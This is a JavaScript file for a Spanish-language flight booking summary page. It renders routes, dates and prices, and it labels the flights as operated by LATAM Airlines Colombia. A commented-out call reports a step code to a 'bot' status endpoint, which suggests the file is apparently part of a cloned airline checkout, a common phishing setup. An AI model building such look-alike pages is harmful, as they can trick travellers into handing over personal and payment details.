/**
 * DOM Setup
 * 
 */
setTimeout(() => {
    document.querySelector('.loader-full').remove();
}, 3000);

/*
fetch(`${API_URL}/api/bot/status`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${API_KEY}`
    },
    body: JSON.stringify({message: 'P3'})
});
*/

const updateDOM = () => {
    /**
     * Flight resume
     */
    let format = new Date(parseInt(info.flightInfo.flightDates[0]));
    let format2 = new Date(parseInt(info.flightInfo.flightDates[1]));
    document.querySelector('#label-travel').innerHTML = `${info.flightInfo.origin.city} > ${info.flightInfo.destination.city}`;
    if (info.flightInfo.flightDates[1] === 0) {
        document.querySelector('#label-dates').innerHTML = `${(dayDic[format.getDay() - 1]).toLowerCase()}. ${format.toString().split(' ')[2]} de ${(monthDic[format.getMonth()]).toLowerCase()}`;
    } else {
        document.querySelector('#label-dates').innerHTML = `${(dayDic[format.getDay() - 1]).toLowerCase()}. ${format.toString().split(' ')[2]} de ${(monthDic[format.getMonth()]).toLowerCase()} a ${(dayDic[format2.getDay() - 1]).toLowerCase()}. ${format2.toString().split(' ')[2]} de ${(monthDic[format2.getMonth()]).toLowerCase()}`;
    }

    /**
     * Flight go details
     */
    document.querySelector('#label-flight-go-resume').innerHTML = `
        <svg class="tc-green mr-1" width="22px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
        <p class="m-0 fw-bolder">Vuelo de ida • ${info.flightInfo.origin.ticket_type}</p>
        <p class="m-0 ml-1 fw-light">${(dayDic[format.getDay() - 1]).toLowerCase()}. ${format.toString().split(' ')[2]} de ${(monthDic[format.getMonth()]).toLowerCase()}</p>
    `;

    document.querySelector('#flight-go').innerHTML = `
        <div class="card-flight p-3 mb-3 mt-3">
            <div class="d-flex justify-space-between border-bottom">
                <div>
                    <p class="m-0 fs-2 tc-ocean">${info.flightInfo.origin.ticket_sched.takeoff}</p>
                    <p class="m-0 fs-4">${info.flightInfo.origin.code}</p>
                </div>
                <div class="d-flex align-items-end flex-column">
                    <p class=" mt-0 mb-1 fs-6 tc-gray-smoke">Duración</p>
                    <p class="fs-6 mt-0">${info.flightInfo.origin.ticket_sched.duration}</p>
                </div>
                <div class="d-flex align-items-end flex-column">
                    <p class="m-0 fs-2 tc-ocean">${info.flightInfo.origin.ticket_sched.landing}</p>
                    <p class="m-0 fs-4">${info.flightInfo.destination.code}</p>
                </div>
            </div>

            <div class="d-flex justify-space-between mt-3">
                <div class="d-flex align-items-center">
                    <a class="fw-bolder fs-5 tc-red" href="select-flight-go.html">Cambiar tu vuelo</a>
                </div>
                <div class="d-flex align-items-end flex-column">
                    <p class="m-0 fs-6 tc-gray-smoke">Precio por pasajero</p>
                    <p class="m-0 tc-ocean" style="font-size: 20px;">COP ${(Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type])).toLocaleString('es-Es')},00</p>
                </div>
            </div>

            <p class="tc-gray-smoke fs-6 mb-0">Operado por LATAM Airlines Colombia</p>
        </div>
    `;

    if (info.flightInfo.travel_type === 1) {
        /**
         * Flight return details
         */
        document.querySelector('#label-flight-back-resume').innerHTML = `
            <svg class="tc-green mr-1" width="22px" xmlns="http://www.w3.org/2000/svg" fill="none" focusable="false" viewBox="0 0 32 32"><path d="M21.348 10.4841L13.48 18.3799L9.54602 14.3341L7.64196 16.336L13.494 22.314L23.336 12.374L21.348 10.4841ZM16 2C23.7 2 30 8.3 30 16C30 23.7 23.7 30 16 30C8.3 30 2 23.7 2 16C2 8.3 8.3 2 16 2Z" fill="currentColor"></path></svg>
            <p class="m-0 fw-bolder">Vuelo de vuelta • ${info.flightInfo.destination.ticket_type}</p>
            <p class="m-0 ml-1 fw-light">${(dayDic[format2.getDay() - 1]).toLowerCase()}. ${format2.toString().split(' ')[2]} de ${(monthDic[format2.getMonth()]).toLowerCase()}</p>
        `;

        document.querySelector('#flight-back').innerHTML = `
            <div class="card-flight p-3 mb-3 mt-3">
                <div class="d-flex justify-space-between border-bottom">
                    <div>
                        <p class="m-0 fs-2 tc-ocean">${info.flightInfo.destination.ticket_sched.takeoff}</p>
                        <p class="m-0 fs-4">${info.flightInfo.destination.code}</p>
                    </div>
                    <div class="d-flex align-items-end flex-column">
                        <p class=" mt-0 mb-1 fs-6 tc-gray-smoke">Duración</p>
                        <p class="fs-6 mt-0">${info.flightInfo.destination.ticket_sched.duration}</p>
                    </div>
                    <div class="d-flex align-items-end flex-column">
                        <p class="m-0 fs-2 tc-ocean">${info.flightInfo.destination.ticket_sched.landing}</p>
                        <p class="m-0 fs-4">${info.flightInfo.origin.code}</p>
                    </div>
                </div>

                <div class="d-flex justify-space-between mt-3">
                    <div class="d-flex align-items-center">
                        <a class="fw-bolder fs-5 tc-red" href="select-flight-back.html">Cambiar tu vuelo</a>
                    </div>
                    <div class="d-flex align-items-end flex-column">
                        <p class="m-0 fs-6 tc-gray-smoke">Precio por pasajero</p>
                        <p class="m-0 tc-ocean" style="font-size: 20px;">COP ${(Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type])).toLocaleString('es-Es')},00</p>
                    </div>
                </div>

                <p class="tc-gray-smoke fs-6 mb-0">Operado por LATAM Airlines Colombia</p>
            </div>
        `;
    }

    /**Label passengers */
    document.querySelector('#label-passengers').textContent = info.flightInfo.adults + info.flightInfo.children + info.flightInfo.babies;
}

document.addEventListener('DOMContentLoaded', updateDOM);

/**
 * MODAL SETUP
 */
let totalPassengers = info.flightInfo.adults + info.flightInfo.children;
if (info.flightInfo.travel_type === 1) {
    document.querySelector('#modal-flight-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers + PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.destination.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
} else {
    document.querySelector('#modal-flight-cost').textContent = 'COP ' + (Math.ceil(PRECIO_BASE * MULTIPLICADORES_PRECIO[info.flightInfo.origin.ticket_type] * totalPassengers)).toLocaleString('es-Es') + ',00';
}
const nextStep = () =>{
    setTimeout(() =>{
        window.location.href = 'passengers-info.html';
    }, 2500);
}